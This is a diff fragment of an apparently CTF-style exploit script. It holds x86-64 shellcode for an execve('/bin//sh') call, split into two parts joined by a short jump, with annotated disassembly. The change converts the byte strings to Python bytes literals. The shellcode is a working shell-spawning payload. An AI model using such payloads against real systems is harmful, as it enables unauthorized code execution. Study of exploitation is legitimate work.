@@ -23,7 +23,7 @@ head = b"\x0c\x87\x63\xd0"
 Instruction """
 
 # 4 ~ 19th bytes
-shellcode_sys_exeve_part1 = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\xeb\x04"
+shellcode_sys_exeve_part1 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\xeb\x04"
 """ Instruction
 48 31 f6                xor    rsi, rsi
 56                      push   rsi
@@ -33,7 +33,7 @@ eb 04                   jmp short +0x4  # (jmp short 0x4), jump to buf[24]
 Instruction """
 
 # 24 ~ 32th bytes
-shellcode_sys_exeve_part2 = "\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+shellcode_sys_exeve_part2 = b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 """ Instruction
 57                      push   rdi
 54                      push   rsp
